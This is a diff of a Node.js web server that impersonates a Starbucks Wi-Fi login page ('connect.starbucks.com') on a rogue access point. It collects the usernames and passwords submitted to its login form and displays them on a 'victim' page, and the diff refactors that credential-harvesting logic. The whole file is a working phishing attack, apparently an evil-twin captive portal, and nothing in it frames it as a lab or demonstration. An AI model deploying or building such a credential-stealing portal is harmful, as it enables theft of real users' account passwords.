@@ -2,7 +2,7 @@
 
 const selfAddress = '10.0.0.1';
 const selfPort = 80;
-const logRequests = true;
+const logRequests = false;
 const logCredentials = false;
 const domainName = 'connect.starbucks.com';
 
@@ -14,7 +14,7 @@ const uuid = require('uuid');
 
 // Functions
 
-function handleGet(req, res) {
+function handleGet(req, res, serverState) {
   if (req.headers.host != domainName) {
     writeResponse(res, 302, { 'Location': 'http://' + domainName + '/' },
     'Loading...');
@@ -24,37 +24,37 @@ function handleGet(req, res) {
   let resource = req.url;
   switch (resource) {
     case '/':
-      resource = '/login.html';
+      if (cookies.id
+      && checkCredentialsEntry(serverState.credentials, cookies.id)) {
+        resource = '/victim.html';
+      } else {
+        resource = '/login.html';
+      }
       break;
     case '/favicon.ico':
       resource = '/img/favicon.ico';
       break;
-    case '/gg':
-      resource = '/hacked.html';
-      break;
   }
   readResource(resource, () => {
-    writeResponse(res, 404, {}, 'Not Found');
+    writeResponse(res, 302, { 'Location': 'http://' + domainName + '/' },
+    'Loading...');
   }, contentBuffer => {
-    if (resource == '/hacked.html') {
-      if (cookies.id) {
-        if (credentials[cookies.id] && credentials[cookies.id].username
-        && credentials[cookies.id].password) {
-          let contentString = contentBuffer.toString();
-          contentString = contentString.replace('[PLACEHOLDER_USERNAME]',
-          credentials[cookies.id].username);
-          contentString = contentString.replace('[PLACEHOLDER_PASSWORD]',
-          credentials[cookies.id].password);
-          contentBuffer = Buffer.from(contentString, 'utf8');
-        }
-        delete credentials[cookies.id];
+    if (resource == '/victim.html' && cookies.id) {
+      if (checkCredentialsEntry(serverState.credentials, cookies.id)) {
+        let contentString = contentBuffer.toString();
+        contentString = contentString.replace('[PLACEHOLDER_USERNAME]',
+        serverState.credentials[cookies.id].username);
+        contentString = contentString.replace('[PLACEHOLDER_PASSWORD]',
+        serverState.credentials[cookies.id].password);
+        contentBuffer = Buffer.from(contentString, 'utf8');
       }
+      delete serverState.credentials[cookies.id];
     }
     writeResponse(res, 200, {}, contentBuffer);
   });
 }
 
-function handlePost(req, res) {
+function handlePost(req, res, serverState) {
   if (req.headers.host != domainName) {
     writeResponse(res, 302, { 'Location': 'http://' + domainName + '/' },
     'Loading...');
@@ -65,12 +65,12 @@ function handlePost(req, res) {
     case '/login':
       parseFormData(req, formData => {
         let id = uuid.v4();
-        credentials[id] = {};
-        credentials[id] = formData;
+        serverState.credentials[id] = {};
+        serverState.credentials[id] = formData;
         if (logCredentials) {
-          console.log(credentials[id]);
+          console.log(serverState.credentials[id]);
         }
-        writeResponse(res, 302, { 'Location': '/gg', 'Set-Cookie': 'id=' + id },
+        writeResponse(res, 302, { 'Location': '/', 'Set-Cookie': 'id=' + id },
         'Loading...');
       });
       break;
@@ -128,9 +128,16 @@ function parseCookies(cookieHeader) {
   return cookies;
 }
 
+function checkCredentialsEntry(credentials, id) {
+  return credentials[id] && credentials[id].username
+  && credentials[id].password;
+}
+
 // Main script
 
-let credentials = {};
+let serverState = {
+  credentials: {}
+};
 
 http.createServer((req, res) => {
   if (logRequests) {
@@ -138,10 +145,10 @@ http.createServer((req, res) => {
   }
   switch (req.method) {
     case 'GET':
-      handleGet(req, res);
+      handleGet(req, res, serverState);
       break;
     case 'POST':
-      handlePost(req, res);
+      handlePost(req, res, serverState);
       break;
     default:
       handleUnsupported(res);
